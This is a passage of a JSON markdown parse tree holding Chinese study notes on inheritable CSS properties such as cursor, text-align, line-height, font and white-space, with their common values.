wait：显示一个旋转的沙漏或类似的等待指针，表示操作正在进行\\n    move：显示一个四向箭头，表示可以移动元素\\n    text：显示文本光标，通常用于文本输入区域\\n    not-allowed：显示禁用的指针，通常表示该操作不可用\\n    help：显示问号光标，通常表示需要帮助的地方","task":false,"loose":true,"text":"cursor\\ncursor 属性控制鼠标指针在元素上的样式，通常用于改变鼠标悬停在某个元素上时的外观；\\n常见值包括：\\n  auto：默认指针，浏览器根据上下文决定指针样式\\n  pointer：显示手形指针，通常用于可点击的链接或按钮\\n  default：默认的光标样式\\n  none：隐藏鼠标指针\\n  wait：显示一个旋转的沙漏或类似的等待指针，表示操作正在进行\\n  move：显示一个四向箭头，表示可以移动元素\\n  text：显示文本光标，通常用于文本输入区域\\n  not-allowed：显示禁用的指针，通常表示该操作不可用\\n  help：显示问号光标，通常表示需要帮助的地方","tokens":[{"type":"text","raw":"cursor\\n\\ncursor 属性控制鼠标指针在元素上的样式，通常用于改变鼠标悬停在某个元素上时的外观；\\n\\n常见值包括：\\n\\n  auto：默认指针，浏览器根据上下文决定指针样式\\n\\n  pointer：显示手形指针，通常用于可点击的链接或按钮\\n\\n  default：默认的光标样式\\n\\n  none：隐藏鼠标指针\\n\\n  wait：显示一个旋转的沙漏或类似的等待指针，表示操作正在进行\\n\\n  move：显示一个四向箭头，表示可以移动元素\\n\\n  text：显示文本光标，通常用于文本输入区域\\n\\n  not-allowed：显示禁用的指针，通常表示该操作不可用\\n\\n  help：显示问号光标，通常表示需要帮助的地方","text":"cursor\\ncursor 属性控制鼠标指针在元素上的样式，通常用于改变鼠标悬停在某个元素上时的外观；\\n常见值包括：\\n  auto：默认指针，浏览器根据上下文决定指针样式\\n  pointer：显示手形指针，通常用于可点击的链接或按钮\\n  default：默认的光标样式\\n  none：隐藏鼠标指针\\n  wait：显示一个旋转的沙漏或类似的等待指针，表示操作正在进行\\n  move：显示一个四向箭头，表示可以移动元素\\n  text：显示文本光标，通常用于文本输入区域\\n  not-allowed：显示禁用的指针，通常表示该操作不可用\\n  help：显示问号光标，通常表示需要帮助的地方","tokens":[{"type":"text","raw":"cursor\\ncursor 属性控制鼠标指针在元素上的样式，通常用于改变鼠标悬停在某个元素上时的外观；\\n常见值包括：\\n  auto：默认指针，浏览器根据上下文决定指针样式\\n  pointer：显示手形指针，通常用于可点击的链接或按钮\\n  default：默认的光标样式\\n  none：隐藏鼠标指针\\n  wait：显示一个旋转的沙漏或类似的等待指针，表示操作正在进行\\n  move：显示一个四向箭头，表示可以移动元素\\n  text：显示文本光标，通常用于文本输入区域\\n  not-allowed：显示禁用的指针，通常表示该操作不可用\\n  help：显示问号光标，通常表示需要帮助的地方","text":"cursor\\ncursor 属性控制鼠标指针在元素上的样式，通常用于改变鼠标悬停在某个元素上时的外观；\\n常见值包括：\\n  auto：默认指针，浏览器根据上下文决定指针样式\\n  pointer：显示手形指针，通常用于可点击的链接或按钮\\n  default：默认的光标样式\\n  none：隐藏鼠标指针\\n  wait：显示一个旋转的沙漏或类似的等待指针，表示操作正在进行\\n  move：显示一个四向箭头，表示可以移动元素\\n  text：显示文本光标，通常用于文本输入区域\\n  not-allowed：显示禁用的指针，通常表示该操作不可用\\n  help：显示问号光标，通常表示需要帮助的地方","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 终极块级元素可继承的\\n\\n  + text-indent\\n    text-indent 用于控制文本的首行缩进；这个属性通常应用于块级元素，如 `<p>、<div>` 等，控制块内文本的缩进量；常见值：\\n      length：指定缩进的距离，例如 20px 或 2em\\n      %：表示缩进的百分比，基于元素的宽度\\n      initial：将属性恢复为默认值\\n\\n  + text-align\\n    text-align 用于设置块级元素内文本的对齐方式，可以控制文本或内联元素在其父容器中的水平对齐，常见值：\\n      left：将文本对齐到左边\\n      right：将文本对齐到右边\\n      center：将文本居中\\n      justify：将文本两端对齐，通常用于段落，使得文本两端都紧贴容器\\n      start 和 end：依据书写方向（左到右或右到左）自动决定对齐方式\\n\\n","task":false,"loose":true,"text":"**1：** 终极块级元素可继承的\\n\\n+ text-indent\\n  text-indent 用于控制文本的首行缩进；这个属性通常应用于块级元素，如 `<p>、<div>` 等，控制块内文本的缩进量；常见值：\\n    length：指定缩进的距离，例如 20px 或 2em\\n    %：表示缩进的百分比，基于元素的宽度\\n    initial：将属性恢复为默认值\\n\\n+ text-align\\n  text-align 用于设置块级元素内文本的对齐方式，可以控制文本或内联元素在其父容器中的水平对齐，常见值：\\n    left：将文本对齐到左边\\n    right：将文本对齐到右边\\n    center：将文本居中\\n    justify：将文本两端对齐，通常用于段落，使得文本两端都紧贴容器\\n    start 和 end：依据书写方向（左到右或右到左）自动决定对齐方式\\n","tokens":[{"type":"text","raw":"**1：** 终极块级元素可继承的","text":"**1：** 终极块级元素可继承的","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 终极块级元素可继承的","text":" 终极块级元素可继承的","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"+ text-indent\\n  text-indent 用于控制文本的首行缩进；这个属性通常应用于块级元素，如 `<p>、<div>` 等，控制块内文本的缩进量；常见值：\\n    length：指定缩进的距离，例如 20px 或 2em\\n    %：表示缩进的百分比，基于元素的宽度\\n    initial：将属性恢复为默认值\\n\\n+ text-align\\n  text-align 用于设置块级元素内文本的对齐方式，可以控制文本或内联元素在其父容器中的水平对齐，常见值：\\n    left：将文本对齐到左边\\n    right：将文本对齐到右边\\n    center：将文本居中\\n    justify：将文本两端对齐，通常用于段落，使得文本两端都紧贴容器\\n    start 和 end：依据书写方向（左到右或右到左）自动决定对齐方式\\n","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"+ text-indent\\n  text-indent 用于控制文本的首行缩进；这个属性通常应用于块级元素，如 `<p>、<div>` 等，控制块内文本的缩进量；常见值：\\n    length：指定缩进的距离，例如 20px 或 2em\\n    %：表示缩进的百分比，基于元素的宽度\\n    initial：将属性恢复为默认值\\n\\n","task":false,"loose":true,"text":"text-indent\\ntext-indent 用于控制文本的首行缩进；这个属性通常应用于块级元素，如 `<p>、<div>` 等，控制块内文本的缩进量；常见值：\\n  length：指定缩进的距离，例如 20px 或 2em\\n  %：表示缩进的百分比，基于元素的宽度\\n  initial：将属性恢复为默认值\\n","tokens":[{"type":"text","raw":"text-indent\\n\\ntext-indent 用于控制文本的首行缩进；这个属性通常应用于块级元素，如 `<p>、<div>` 等，控制块内文本的缩进量；常见值：\\n\\n  length：指定缩进的距离，例如 20px 或 2em\\n\\n  %：表示缩进的百分比，基于元素的宽度\\n\\n  initial：将属性恢复为默认值\\n","text":"text-indent\\ntext-indent 用于控制文本的首行缩进；这个属性通常应用于块级元素，如 `<p>、<div>` 等，控制块内文本的缩进量；常见值：\\n  length：指定缩进的距离，例如 20px 或 2em\\n  %：表示缩进的百分比，基于元素的宽度\\n  initial：将属性恢复为默认值","tokens":[{"type":"text","raw":"text-indent\\ntext-indent 用于控制文本的首行缩进；这个属性通常应用于块级元素，如 ","text":"text-indent\\ntext-indent 用于控制文本的首行缩进；这个属性通常应用于块级元素，如 ","escaped":false},{"type":"codespan","raw":"`<p>、<div>`","text":"<p>、<div>"},{"type":"text","raw":" 等，控制块内文本的缩进量；常见值：\\n  length：指定缩进的距离，例如 20px 或 2em\\n  %：表示缩进的百分比，基于元素的宽度\\n  initial：将属性恢复为默认值","text":" 等，控制块内文本的缩进量；常见值：\\n  length：指定缩进的距离，例如 20px 或 2em\\n  %：表示缩进的百分比，基于元素的宽度\\n  initial：将属性恢复为默认值","escaped":false}]}]},{"type":"list_item","raw":"+ text-align\\n  text-align 用于设置块级元素内文本的对齐方式，可以控制文本或内联元素在其父容器中的水平对齐，常见值：\\n    left：将文本对齐到左边\\n    right：将文本对齐到右边\\n    center：将文本居中\\n    justify：将文本两端对齐，通常用于段落，使得文本两端都紧贴容器\\n    start 和 end：依据书写方向（左到右或右到左）自动决定对齐方式","task":false,"loose":true,"text":"text-align\\ntext-align 用于设置块级元素内文本的对齐方式，可以控制文本或内联元素在其父容器中的水平对齐，常见值：\\n  left：将文本对齐到左边\\n  right：将文本对齐到右边\\n  center：将文本居中\\n  justify：将文本两端对齐，通常用于段落，使得文本两端都紧贴容器\\n  start 和 end：依据书写方向（左到右或右到左）自动决定对齐方式","tokens":[{"type":"text","raw":"text-align\\n\\ntext-align 用于设置块级元素内文本的对齐方式，可以控制文本或内联元素在其父容器中的水平对齐，常见值：\\n\\n  left：将文本对齐到左边\\n\\n  right：将文本对齐到右边\\n\\n  center：将文本居中\\n\\n  justify：将文本两端对齐，通常用于段落，使得文本两端都紧贴容器\\n\\n  start 和 end：依据书写方向（左到右或右到左）自动决定对齐方式","text":"text-align\\ntext-align 用于设置块级元素内文本的对齐方式，可以控制文本或内联元素在其父容器中的水平对齐，常见值：\\n  left：将文本对齐到左边\\n  right：将文本对齐到右边\\n  center：将文本居中\\n  justify：将文本两端对齐，通常用于段落，使得文本两端都紧贴容器\\n  start 和 end：依据书写方向（左到右或右到左）自动决定对齐方式","tokens":[{"type":"text","raw":"text-align\\ntext-align 用于设置块级元素内文本的对齐方式，可以控制文本或内联元素在其父容器中的水平对齐，常见值：\\n  left：将文本对齐到左边\\n  right：将文本对齐到右边\\n  center：将文本居中\\n  justify：将文本两端对齐，通常用于段落，使得文本两端都紧贴容器\\n  start 和 end：依据书写方向（左到右或右到左）自动决定对齐方式","text":"text-align\\ntext-align 用于设置块级元素内文本的对齐方式，可以控制文本或内联元素在其父容器中的水平对齐，常见值：\\n  left：将文本对齐到左边\\n  right：将文本对齐到右边\\n  center：将文本居中\\n  justify：将文本两端对齐，通常用于段落，使得文本两端都紧贴容器\\n  start 和 end：依据书写方向（左到右或右到左）自动决定对齐方式","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 内联元素可继承的\\n  + letter-spacing\\n    letter-spacing 用于设置文本中字符之间的间距。它控制字母之间的距离，可以让文本看起来更加紧凑或更加宽松，常见值：\\n      normal：默认的字符间距，通常为 0\\n      length：指定字符间的间距，可以使用单位如 px、em、rem 等。例如，2px 或 0.1em\\n\\n  + word-spacing\\n    word-spacing 用于设置单词之间的间距。它控制单词之间的空白区域，可以增加或减少单词间的空隙。\\n    常见值：\\n      normal：默认的单词间距。\\n      length：指定单词间距，可以使用 px、em、rem 等单位。\\n\\n  + white-space\\n    white-space 用于控制元素内文本的空白字符处理方式。它决定了文本中的空格、换行等如何展示；常见值：\\n      normal：默认值，连续空白字符会合并为一个空格，文本会自动换行\\n      nowrap：文本不会换行，所有空白字符会被合并为一个空格\\n      pre：保留空格和换行符，类似于 `<pre>` 标签的效果\\n      pre-wrap：保留空格和换行符，文本会自动换行\\n      pre-line：合并多个空白字符，但保留换行符\\n\\n  + line-height\\n    line-height 用于设置文本行与行之间的垂直间距。它控制行之间的间隔，通常用于改善文本的可读性；常见值：\\n      normal：默认的行高，通常为字体大小的 1.2 倍。\\n      number：指定行高为字体大小的倍数。\\n      length：指定固定的行高值，如 20px、1.5em。\\n      percentage：指定行高为字体大小的百分比。\\n\\n  + color\\n    color 用于设置文本的颜色，常见值：\\n      color：任何有效的颜色值，例如 red、#ff0000、rgb(255, 0, 0)、rgba(255, 0, 0, 0.5)。\\n\\n  + font\\n\\n    font 是一个简写属性，用于设置字体相关的多个属性。它可以同时设置字体系列、字体样式、字体粗细、字体大小等；常见值：\\n      font-style、font-variant、font-weight、font-size、line-height、font-family\\n  + font-size\\n    font-size 用于设置文本的大小；常见值：\\n      length：如 12px、1em、0.75rem。\\n      percentage：相对于父元素的字体大小，如 150%。\\n      medium：默认字体大小。\\n      larger / smaller：相对于父元素字体大小的大小调整。\\n\\n  + font-style\\n    font-style 用于设置文本的样式，通常用于斜体文本；常见值：\\n      normal：正常样式\\n      italic：斜体\\n      oblique：倾斜字体，通常与 italic 类似，但不是正式的斜体字形\\n\\n  + font-variant\\n    font-variant 用于控制文本是否使用变体字体；常见值：\\n      normal：正常字体。\\n      small-caps：小型大写字母，通常用于显示大写字母，但它们比普通大写字母小。\\n\\n  + font-weight\\n    font-weight 用于设置文本的粗细；常见值：\\n      normal：正常的字体粗细\\n      bold：加粗字体\\n      bolder：比父元素更粗\\n      lighter：比父元素更细\\n      number：可以指定 100 到 900 之间的数值，例如 400 是正常粗细，700 是加粗\\n\\n  + text-decoration\\n    text-decoration 用于设置文本的装饰效果，如下划线、删除线等；常见值：\\n      none：无装饰\\n      underline：下划线\\n      overline：上划线\\n      line-through：删除线\\n      blink：闪烁的文本（大多数浏览器已不支持）\\n\\n  + text-transform\\n    text-transform 用于控制文本的大小写转换；常见值：\\n      none：不转换大小写\\n      capitalize：将每个单词的首字母转换为大写\\n      uppercase：将所有字母转换为大写\\n      lowercase：将所有字母转换为小写\\n\\n  + direction\\n    direction 用于设置文本的书写方向；常见值：\\n      ltr：从左到右（默认）\\n      rtl：从右到左，通常用于阿拉伯语、希伯来语等语言\\n\\n","task":false,"loose":true,"text":"**1：** 内联元素可继承的\\n+ letter-spacing\\n  letter-spacing 用于设置文本中字符之间的间距。它控制字母之间的距离，可以让文本看起来更加紧凑或更加宽松，常见值：\\n    normal：默认的字符间距，通常为 0\\n    length：指定字符间的间距，可以使用单位如 px、em、rem 等。例如，2px 或 0.1em\\n\\n+ word-spacing\\n  word-spacing 用于设置单词之间的间距。它控制单词之间的空白区域，可以增加或减少单词间的空隙。\\n  常见值：\\n    normal：默认的单词间距。\\n    length：指定单词间距，可以使用 px、em、rem 等单位。\\n\\n+ white-space\\n  white-space 用于控制元素内文本的空白字符处理方式。它决定了文本中的空格、换行等如何展示；常见值：\\n    normal：默认值，连续空白字符会合并为一个空格，文本会自动换行\\n    nowrap：文本不会换行，所有空白字符会被合并为一个空格\\n    pre：保留空格和换行符，类似于 `<pre>` 标签的效果\\n    pre-wrap：保留空格和换行符，文本会自动换行\\n    pre-line：合并多个空白字符，但保留换行符\\n\\n+ line-height\\n  line-height 用于设置文本行与行之间的垂直间距。它控制行之间的间隔，通常用于改善文本的可读性；常见值：\\n    normal：默认的行高，通常为字体大小的 1.2 倍。\\n    number：指定行高为字体大小的倍数。\\n    length：指定固定的行高值，如 20px、1.5em。\\n    percentage：指定行高为字体大小的百分比。\\n\\n+ color\\n  color 用于设置文本的颜色，常见值：\\n    color：任何有效的颜色值，例如 red、#ff0000、rgb(255, 0, 0)、rgba(255, 0, 0, 0.5)。\\n\\n+ font\\n\\n  font 是一个简写属性，用于设置字体相关的多个属性。它可以同时设置字体系列、字体样式、字体粗细、字体大小等；常见值：\\n    font-style、font-variant、font-weight、font-size、line-height、font-family\\n+ font-size\\n  font-size 用于设置文本的大小；常见值：\\n    length：如 12px、1em、0.75rem。\\n    percentage：相对于父元素的字体大小，如 150%。\\n    medium：默认字体大小。\\n    larger / smaller：相对于父元素字体大小的大小调整。\\n\\n+ font-style\\n  font-style 用于设置文本的样式，通常用于斜体文本；常见值：\\n    normal：正常样式\\n    italic：斜体\\n    oblique：倾斜字体，通常与 italic 类似，但不是正式的斜体字形\\n\\n+ font-variant\\n  font-variant 用于控制文本是否使用变体字体；常见值：\\n    normal：正常字体。\\n    small-caps：小型大写字母，通常用于显示大写字母，但它们比普通大写字母小。\\n\\n+ font-weight\\n  font-weight 用于设置文本的粗细；常见值：\\n    normal：正常的字体粗细\\n    bold：加粗字体\\n    bolder：比父元素更粗\\n    lighter：比父元素更细\\n    number：可以指定 100 到 900 之间的数值，例如 400 是正常粗细，700 是加粗\\n\\n+ text-decoration\\n  text-decoration 用于设置文本的装饰效果，如下划线、删除线等；常见值：\\n    none：无装饰\\n    underline：下划线\\n    overline：上划线\\n    line-through：删除线\\n    blink：闪烁的文本（大多数浏览器已不支持）\\n\\n+ text-transform\\n  text-transform 用于控制文本的大小写转换；常见值：\\n    none：不转换大小写\\n    capitalize：将每个单词的首字母转换为大写\\n    uppercase：将所有字母转换为大写\\n    lowercase：将所有字母转换为小写\\n\\n+ direction\\n  direction 用于设置文本的书写方向；常见值：\\n    ltr：从左到右（默认）\\n    rtl：从右到左，通常用于阿拉伯语、希伯来语等语言\\n","tokens":[{"type":"text","raw":"**1：** 内联元素可继承的\\n","text":"**1：** 内联元素可继承的","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 内联元素可继承的","text":" 内联元素可继承的","escaped":false}]},{"type":"list","raw":"+ letter-spacing\\n  letter-spacing 用于设置文本中字符之间的间距。它控制字母之间的距离，可以让文本看起来更加紧凑或更加宽松，常见值：\\n    normal：默认的字符间距，通常为 0\\n    length：指定字符间的间距，可以使用单位如 px、em、rem 等。例如，2px 或 0.1em\\n\\n+ word-spacing\\n  word-spacing 用于设置单词之间的间距。它控制单词之间的空白区域，可以增加或减少单词间的空隙。\\n  常见值：\\n    normal：默认的单词间距。\\n    length：指定单词间距，可以使用 px、em、rem 等单位。\\n\\n+ white-space\\n  white-space 用于控制元素内文本的空白字符处理方式。它决定了文本中的空格、换行等如何展示；常见值：\\n    normal：默认值，连续空白字符会合并为一个空格，文本会自动换行\\n    nowrap：文本不会换行，所有空白字符会被合并为一个空格\\n    pre：保留空格和换行符，类似于 `<pre>` 标签的效果\\n    pre-wrap：保留空格和换行符，文本会自动换行\\n    pre-line：合并多个空白字符，但保留换行符\\n\\n+ line-height\\n  line-height 用于设置文本行与行之间的垂直间距。它控制行之间的间隔，通常用于改善文本的可读性；常见值：\\n    normal：默认的行高，通常为字体大小的 1.2 倍。\\n    number：指定行高为字体大小的倍数。\\n    length：指定固定的行高值，如 20px、1.5em。\\n    percentage：指定行高为字体大小的百分比。\\n\\n+ color\\n  color 用于设置文本的颜色，常见值：\\n    color：任何有效的颜色值，例如 red、#ff0000、rgb(255, 0, 0)、rgba(255, 0, 0, 0.5)。\\n\\n+ font\\n\\n  font 是一个简写属性，用于设置字体相关的多个属性。它可以同时设置字体系列、字体样式、字体粗细、字体大小等；常见值：\\n    font-style、font-variant、font-weight、font-size、line-height、font-family\\n+ font-size\\n  font-size 用于设置文本的大小；常见值：\\n    length：如 12px、1em、0.75rem。\\n    percentage：相对于父元素的字体大小，如 150%。\\n    medium：默认字体大小。\\n    larger / smaller：相对于父元素字体大小的大小调整。\\n\\n+ font-style\\n  font-style 用于设置文本的样式，通常用于斜体文本；常见值：\\n    normal：正常样式\\n    italic：斜体\\n    oblique：倾斜字体，通常与 italic 类似，但不是正式的斜体字形\\n\\n+ font-variant\\n  font-variant 用于控制文本是否使用变体字体；常见值：\\n    normal：正常字体。\\n    small-caps：小型大写字母，通常用于显示大写字母，但它们比普通大写字母小。\\n\\n+ font-weight\\n  font-weight 用于设置文本的粗细；常见值：\\n    normal：正常的字体粗细\\n    bold：加粗字体\\n    bolder：比父元素更粗\\n    lighter：比父元素更细\\n    number：可以指定 100 到 900 之间的数值，例如 400 是正常粗细，700 是加粗\\n\\n+ text-decoration\\n  text-decoration 用于设置文本的装饰效果，如下划线、删除线等；常见值：\\n    none：无装饰\\n    underline：下划线\\n    overline：上划线\\n    line-through：删除线\\n    blink：闪烁的文本（大多数浏览器已不支持）\\n\\n+ text-transform\\n  text-transform 用于控制文本的大小写转换；常见值：\\n    none：不转换大小写\\n    capitalize：将每个单词的首字母转换为大写\\n    uppercase：将所有字母转换为大写\\n    lowercase：将所有字母转换为小写\\n\\n+ direction\\n  direction 用于设置文本的书写方向；常见值：\\n    ltr：从左到右（默认）\\n    rtl：从右到左，通常用于阿拉伯语、希伯来语等语言\\n","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"+ letter-spacing\\n  letter-spacing 用于设置文本中字符之间的间距。它控制字母之间的距离，可以让文本看起来更加紧凑或更加宽松，常见值：\\n    normal：默认的字符间距，通常为 0\\n    length：指定字符间的间距，可以使用单位如 px、em、rem 等。例如，2px 或 0.1em\\n\\n","task":false,"loose":true,"text":"letter-spacing\\nletter-spacing 用于设置文本中字符之间的间距。它控制字母之间的距离，可以让文本看起来更加紧凑或更加宽松，常见值：\\n  normal：默认的字符间距，通常为 0\\n  length：指定字符间的间距，可以使用单位如 px、em、rem 等。例如，2px 或 0.1em\\n","tokens":[{"type":"text","raw":"letter-spacing\\n\\nletter-spacing 用于设置文本中字符之间的间距。它控制字母之间的距离，可以让文本看起来更加紧凑或更加宽松，常见值：\\n\\n  normal：默认的字符间距，通常为 0\\n\\n  length：指定字符间的间距，可以使用单位如 px、em、rem 等。例如，2px 或 0.1em\\n","text":"letter-spacing\\nletter-spacing 用于设置文本中字符之间的间距。它控制字母之间的距离，可以让文本看起来更加紧凑或更加宽松，常见值：\\n  normal：默认的字符间距，通常为 0\\n  length：指定字符间的间距，可以使用单位如 px、em、rem 等。例如，2px 或 0.1em","tokens":[{"type":"text","raw":"letter-spacing\\nletter-spacing 用于设置文本中字符之间的间距。它控制字母之间的距离，可以让文本看起来更加紧凑或更加宽松，常见值：\\n  normal：默认的字符间距，通常为 0\\n  length：指定字符间的间距，可以使用单位如 px、em、rem 等。例如，2px 或 0.1em","text":"letter-spacing\\nletter-spacing 用于设置文本中字符之间的间距。它控制字母之间的距离，可以让文本看起来更加紧凑或更加宽松，常见值：\\n  normal：默认的字符间距，通常为 0\\n  length：指定字符间的间距，可以使用单位如 px、em、rem 等。例如，2px 或 0.1em","escaped":false}]}]},{"type":"list_item","raw":"+ word-spacing\\n  word-spacing 用于设置单词之间的间距。它控制单词之间的空白区域，可以增加或减少单词间的空隙。\\n  常见值：\\n    normal：默认的单词间距。\\n    length：指定单词间距，可以使用 px、em、rem 等单位。\\n\\n","task":false,"loose":true,"text":"word-spacing\\nword-spacing 用于设置单词之间的间距。它控制单词之间的空白区域，可以增加或减少单词间的空隙。\\n常见值：\\n  normal：默认的单词间距。\\n  length：指定单词间距，可以使用 px、em、rem 等单位。\\n","tokens":[{"type":"text","raw":"word-spacing\\n\\nword-spacing 用于设置单词之间的间距。它控制单词之间的空白区域，可以增加或减少单词间的空隙。\\n\\n常见值：\\n\\n  normal：默认的单词间距。\\n\\n  length：指定单词间距，可以使用 px、em、rem 等单位。\\n","text":"word-spacing\\nword-spacing 用于设置单词之间的间距。它控制单词之间的空白区域，可以增加或减少单词间的空隙。\\n常见值：\\n  normal：默认的单词间距。\\n  length：指定单词间距，可以使用 px、em、rem 等单位。","tokens":[{"type":"text","raw":"word-spacing\\nword-spacing 用于设置单词之间的间距。它控制单词之间的空白区域，可以增加或减少单词间的空隙。\\n常见值：\\n  normal：默认的单词间距。\\n  length：指定单词间距，可以使用 px、em、rem 等单位。","text":"word-spacing\\nword-spacing 用于设置单词之间的间距。它控制单词之间的空白区域，可以增加或减少单词间的空隙。\\n常见值：\\n  normal：默认的单词间距。\\n  length：指定单词间距，可以使用 px、em、rem 等单位。","escaped":false}]}]},{"type":"list_item","raw":"+ white-space\\n  white-space 用于控制元素内文本的空白字符处理方式。它决定了文本中的空格、换行等如何展示；常见值：\\n    normal：默认值，连续空白字符会合并为一个空格，文本会自动换行\\n    nowrap：文本不会换行，所有空白字符会被合并为一个空格\\n    pre：保留空格和换行符，类似于 `<pre>` 标签的效果\\n    pre-wrap：保留空格和换行符，文本会自动换行\\n    pre-line：合并多个空白字符，但保留换行符\\n\\n","task":false,"loose":true,"text":"white-space\\nwhite-space 用于控制元素内文本的空白字符处理方式。它决定了文本中的空格、换行等如何展示；常见值：\\n  normal：默认值，连续空白字符会合并为一个空格，文本会自动换行\\n  nowrap：文本不会换行，所有空白字符会被合并为一个空格\\n  pre：保留空格和换行符，类似于 `<pre>` 标签的效果\\n  pre-wrap：保留空格和换行符，文本会自动换行\\n  pre-line：合并多个空白字符，但保留换行符\\n","tokens":[{"type":"text","raw":"white-space\\n\\nwhite-space 用于控制元素内文本的空白字符处理方式。它决定了文本中的空格、换行等如何展示；常见值：\\n\\n  normal：默认值，连续空白字符会合并为一个空格，文本会自动换行\\n\\n  nowrap：文本不会换行，所有空白字符会被合并为一个空格\\n\\n  pre：保留空格和换行符，类似于 `<pre>` 标签的效果\\n\\n  pre-wrap：保留空格和换行符，文本会自动换行\\n\\n  pre-line：合并多个空白字符，但保留换行符\\n","text":"white-space\\nwhite-space 用于控制元素内文本的空白字符处理方式。它决定了文本中的空格、换行等如何展示；常见值：\\n  normal：默认值，连续空白字符会合并为一个空格，文本会自动换行\\n  nowrap：文本不会换行，所有空白字符会被合并为一个空格\\n  pre：保留空格和换行符，类似于 `<pre>` 标签的效果\\n  pre-wrap：保留空格和换行符，文本会自动换行\\n  pre-line：合并多个空白字符，但保留换行符","tokens":[{"type":"text","raw":"white-space\\nwhite-space 用于控制元素内文本的空白字符处理方式。它决定了文本中的空格、换行等如何展示；常见值：\\n  normal：默认值，连续空白字符会合并为一个空格，文本会自动换行\\n  nowrap：文本不会换行，所有空白字符会被合并为一个空格\\n  pre：保留空格和换行符，类似于 ","text":"white-space\\nwhite-space 用于控制元素内文本的空白字符处理方式。它决定了文本中的空格、换行等如何展示；常见值：\\n  normal：默认值，连续空白字符会合并为一个空格，文本会自动换行\\n  nowrap：文本不会换行，所有空白字符会被合并为一个空格\\n  pre：保留空格和换行符，类似于 ","escaped":false},{"type":"codespan","raw":"`<pre>`","text":"<pre>"},{"type":"text","raw":" 标签的效果\\n  pre-wrap：保留空格和换行符，文本会自动换行\\n  pre-line：合并多个空白字符，但保留换行符","text":" 标签的效果\\n  pre-wrap：保留空格和换行符，文本会自动换行\\n  pre-line：合并多个空白字符，但保留换行符","escaped":false}]}]},{"type":"list_item","raw":"+ line-height\\n  line-height 用于设置文本行与行之间的垂直间距。它控制行之间的间隔，通常用于改善文本的可读性；常见值：\\n    normal：默认的行高，通常为字体大小的 1.2 倍。\\n    number：指定行高为字体大小的倍数。\\n    length：指定固定的行高值，如 20px、1.5em。\\n    percentage：指定行高为字体大小的百分比。\\n\\n","task":false,"loose":true,"text":"line-height\\nline-height 用于设置文本行与行之间的垂直间距。它控制行之间的间隔，通常用于改善文本的可读性；常见值：\\n  normal：默认的行高，通常为字体大小的 1.2 倍。\\n  number：指定行高为字体大小的倍数。\\n  length：指定固定的行高值，如 20px、1.5em。\\n  percentage：指定行高为字体大小的百分比。\\n","tokens":[{"type":"text","raw":"line-height\\n\\nline-height 用于设置文本行与行之间的垂直间距。它控制行之间的间隔，通常用于改善文本的可读性；常见值：\\n\\n  normal：默认的行高，通常为字体大小的 1.2 倍。\\n\\n  number：指定行高为字体大小的倍数。\\n\\n  length：指定固定的行高值，如 20px、1.5em。\\n\\n  percentage：指定行高为字体大小的百分比。\\n","text":"line-height\\nline-height 用于设置文本行与行之间的垂直间距。它控制行之间的间隔，通常用于改善文本的可读性；常见值：\\n  normal：默认的行高，通常为字体大小的 1.2 倍。\\n  number：指定行高为字体大小的倍数。\\n  length：指定固定的行高值，如 20px、1.5em。\\n  percentage：指定行高为字体大小的百分比。","tokens":[{"type":"text","raw":"line-height\\nline-height 用于设置文本行与行之间的垂直间距。它控制行之间的间隔，通常用于改善文本的可读性；常见值：\\n  normal：默认的行高，通常为字体大小的 1.2 倍。\\n  number：指定行高为字体大小的倍数。\\n  length：指定固定的行高值，如 20px、1.5em。\\n  percentage：指定行高为字体大小的百分比。","text":"line-height\\nline-height 用于设置文本行与行之间的垂直间距。它控制行之间的间隔，通常用于改善文本的可读性；常见值：\\n  normal：默认的行高，通常为字体大小的 1.2 倍。\\n  number：指定行高为字体大小的倍数。\\n  length：指定固定的行高值，如 20px、1.5em。\\n  percentage：指定行高为字体大小的百分比。","escaped":false}]}]},{"type":"list_item","raw":"+ color\\n  color 用于设置文本的颜色，常见值：\\n    color：任何有效的颜色值，例如 red、#ff0000、rgb(255, 0, 0)、rgba(255, 0, 0, 0.5)。\\n\\n","task":false,"loose":true,"text":"color\\ncolor 用于设置文本的颜色，常见值：\\n  color：任何有效的颜色值，例如 red、#ff0000、rgb(255, 0, 0)、rgba(255, 0, 0, 0.5)。\\n","tokens":[{"type":"text","raw":"color\\n\\ncolor 用于设置文本的颜色，常见值：\\n\\n  color：任何有效的颜色值，例如 red、#ff0000、rgb(255, 0, 0)、rgba(255, 0, 0, 0.5)。\\n","text":"color\\ncolor 用于设置文本的颜色，常见值：\\n  color：任何有效的颜色值，例如 red、#ff0000、rgb(255, 0, 0)、rgba(255, 0, 0, 0.5)。","tokens":[{"type":"text","raw":"color\\ncolor 用于设置文本的颜色，常见值：\\n  color：任何有效的颜色值，例如 red、#ff0000、rgb(255, 0, 0)、rgba(255, 0, 0, 0.5)。","text":"color\\ncolor 用于设置文本的颜色，常见值：\\n  color：任何有效的颜色值，例如 red、#ff0000、rgb(255, 0, 0)、rgba(255, 0, 0, 0.5)。","escaped":false}]}]},{"type":"list_item","raw":"+ font\\n\\n  font 是一个简写属性，用于设置字体相关的多个属性。它可以同时设置字体系列、字体样式、字体粗细、字体大小等；常见值：\\n    font-style、font-variant、font-weight、font-size、line-height、font-family\\n","task":false,"loose":true,"text":"font\\n\\nfont 是一个简写属性，用于设置字体相关的多个属性。它可以同时设置字体系列、字体样式、字体粗细、字体大小等；常见值：\\n  font-style、font-variant、font-weight、font-size、line-height、font-family","tokens":[{"type":"text","raw":"font","text":"font","tokens":[{"type":"text","raw":"font","text":"font","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"font 是一个简写属性，用于设置字体相关的多个属性。它可以同时设置字体系列、字体样式、字体粗细、字体大小等；常见值：\\n\\n  font-style、font-variant、font-weight、font-size、line-height、font-family","text":"font 是一个简写属性，用于设置字体相关的多个属性。它可以同时设置字体系列、字体样式、字体粗细、字体大小等；常见值：\\n  